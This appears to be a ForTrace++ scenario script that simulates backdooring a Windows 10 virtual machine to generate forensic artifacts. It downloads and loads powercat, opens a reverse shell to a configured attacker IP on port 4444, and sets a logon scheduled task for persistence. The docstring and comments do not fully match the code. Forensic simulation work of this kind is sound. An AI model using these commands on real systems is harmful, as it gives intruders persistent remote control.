#!/usr/bin/env python3
"""A simple Windows (10) scenario
The scenario might be configured through the YAML located in this directory.

Typical usage:
    > source .venv/bin/activate
    > python scenarios/scenario2-browser_password_exfiltration/scenario2.py
    > python -m http.server 80
"""
import pathlib
import string
from time import sleep

import numpy.random

from fortrace.core.simulation_monitor import SimulationMonitor
from fortrace.core.virsh_domain import GraphicalVirshDomain
from fortrace.fortrace_definitions import FORTRACE_ROOT_DIR
from fortrace.utility.applications.application import (
    ApplicationType,
    GenericApplication,
)
from fortrace.utility.applications.file_manager.windows_explorer import Explorer
from fortrace.utility.applications.text_editor.notepad import Notepad
# Import the PowerShell Class
from fortrace.utility.applications.console.powershell import PowerShell
from fortrace.utility.exceptions import ConfigurationError
from fortrace.utility.image_processing.text_detection import (
    detect_and_recognize_text,
    text_line_contains,
)
from fortrace.utility.logger_helper import setup_logger

# Create a logger using ForTrace++'s logger helper
logger = setup_logger(__name__)


def scenario_1():
    monitor = SimulationMonitor(
        pathlib.Path(
            FORTRACE_ROOT_DIR,
            "scenarios/scenario1-backdoor/scenario1.yaml",
        )
    )
    domain = monitor.participant[0].domain  # type: GraphicalVirshDomain
    config = monitor.participant[0].config

    domain.boot(
        start_sniffer=config["domain"]["start_sniffer"],
        snapshot=config["domain"]["snapshot"],
    )

    domain.env.login(config["domain"]["username"], config["domain"]["password"])

    # Log that the system is unattended
    logger.info("System state: Unattended Windows 10 machine, awaiting attacker action.")

    backdoor_scenario(domain, config)
    monitor.post_scenario()


def backdoor_scenario(domain: GraphicalVirshDomain, config: dict):
    """
    Simulates the installation of a persistent backdoor on a Windows 10 machine.
    Uses the PowerShell interface to download and execute Powercat immediately
    and create a scheduled task for persistence upon user logon.
    """

    # Log the beginning of the attack
    logger.info("Attacker: Initiating unauthorized remote access via backdoor installation on Windows 10.")

    # Open a PowerShell instance with elevated privileges
    ps = domain.env.open_application(
        ApplicationType.TERMINAL, "Windows PowerShell", run_as_administrator=True
    )  # type: PowerShell

    sleep(2)  # Wait for PowerShell window to fully open

    # Step 1: Download Powercat and Save Locally
    ps.send_command(r"$Destination = 'C:\ProgramData\powercat.ps1'", get_output=False)
    sleep(1)
    ps.send_command(r"Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1' -OutFile $Destination", get_output=False)
    sleep(2)  # Ensure download is complete

    # Step 2: Load Powercat into Memory (Dot-Sourcing)
    ps.send_command(r". C:\ProgramData\powercat.ps1", get_output=False)
    sleep(1)

    # Step 3: Execute the Reverse Shell Immediately
    attacker_ip = config["backdoor"]["attacker_ip"]
    reverse_shell_command = rf"powercat -c {attacker_ip} -p 4444 -e cmd.exe"
    ps.send_command(reverse_shell_command, get_output=False)

    # Step 4: Create a Scheduled Task for Persistence on Logon
    '''
    schtasks /create → Creates a new Windows Scheduled Task
    /tn Backdoor → Names the task "Backdoor"
    /tr "powershell -ExecutionPolicy Bypass -File C:\\ProgramData\\powercat.ps1 ..." → Runs Powercat
    /sc onlogon → Runs at user login (for persistence)
    /f → Forces task creation, overwriting any existing task with the same name
    '''
    ps.send_command(rf'schtasks /create /tn "Backdoor" /tr "{reverse_shell_command}" /sc onlogon /f', get_output=False)
    sleep(2)

    # Close the PowerShell application
    ps.close()

    # Log successful execution
    logger.info(f"Attacker: Reverse shell executed. Connection to {attacker_ip} attempted.")
    logger.info("Forensic Artifact: Backdoor installed with persistence at user logon.")




if __name__ == "__main__":
    scenario_1()
